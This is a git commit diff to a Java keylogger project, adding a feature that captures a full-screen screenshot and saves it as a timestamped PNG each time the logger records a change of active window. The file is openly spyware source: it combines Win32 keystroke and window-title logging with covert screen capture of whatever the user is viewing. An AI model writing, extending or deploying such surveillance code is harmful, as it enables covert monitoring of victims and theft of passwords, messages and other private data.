031813c8c36760586d0074b5ffb66da60e4505b0
aswins2108@gmail.com <aswins2108@gmail.com>
2023-05-16 12:31:29 +0530

    Added screenshot capture feature

--- src/Keylogger.java
+++ src/Keylogger.java
@@ -5,12 +5,74 @@ import com.sun.jna.platform.win32.*;
 import com.sun.jna.platform.win32.User32;
 import com.sun.jna.platform.win32.WinUser;
 import com.sun.jna.platform.win32.WinDef.HWND;
+import java.awt.AWTException;
+import java.awt.GraphicsDevice;
+import java.awt.GraphicsEnvironment;
+import java.awt.Rectangle;
+import java.awt.Robot;
+import java.awt.image.BufferedImage;
+import java.io.File;
+import java.io.IOException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import javax.imageio.ImageIO;
+import javax.swing.ImageIcon;
+import javax.swing.JFrame;
+import javax.swing.JLabel;
 // import com.sun.jna.*;
 
 public class Keylogger {
 
     static char[] prev_Window = new char[256];
     static char[] curr_Window = new char[256];
+
+    // Generate a unique file name with date and time
+    private static String generateUniqueFileName(String folderPath, String baseName, String extension) {
+        SimpleDateFormat dateFormat = new SimpleDateFormat("dd-MM-yyyy_HH-mm-ss");
+        String timestamp = dateFormat.format(new Date());
+        String fileName = baseName + "_" + timestamp + "." + extension;
+
+        File file = new File(folderPath, fileName);
+        int count = 1;
+        while (file.exists()) {
+            fileName = baseName + "_" + timestamp + "_" + count + "." + extension;
+            file = new File(folderPath, fileName);
+            count++;
+        }
+        return file.getAbsolutePath();
+    }
+
+    public static void capture() {
+        try {
+            final Robot robot = new Robot();
+            final GraphicsDevice device = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
+            final Rectangle screenRect = device.getDefaultConfiguration().getBounds();
+            final BufferedImage image = robot.createScreenCapture(screenRect);
+            final JLabel label = new JLabel(new ImageIcon(image));
+            final JFrame frame = new JFrame();
+            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+            frame.getContentPane().add(label);
+            frame.setUndecorated(true);
+            device.setFullScreenWindow(frame);
+
+            // Create the screenshots folder if it doesn't exist
+            File screenshotsFolder = new File("screenshots");
+            if (!screenshotsFolder.exists()) {
+                screenshotsFolder.mkdirs();
+            }
+
+            // Generate a unique file name for the screenshot
+            String fileName = generateUniqueFileName(screenshotsFolder.getPath(), "screenshot", "png");
+            File outputFile = new File(fileName);
+            ImageIO.write(image, "png", outputFile);
+            // System.out.println("Screenshot saved to: " + outputFile.getAbsolutePath());
+
+            // Close the frame instead of exiting the program
+            frame.dispose();
+        } catch (AWTException | IOException ex) {
+            System.err.println(ex);
+        }
+    }
 
     static int logger(int key, String file) {
 
@@ -26,6 +88,7 @@ public class Keylogger {
                 PrintWriter printWriter = new PrintWriter(fileWriter);
                 printWriter.printf("\n\n%s\t\t%s\n", String.valueOf(curr_Window).trim(), dt);
                 printWriter.close();
+                capture();
             } catch (IOException e) {
                 e.printStackTrace();
             }
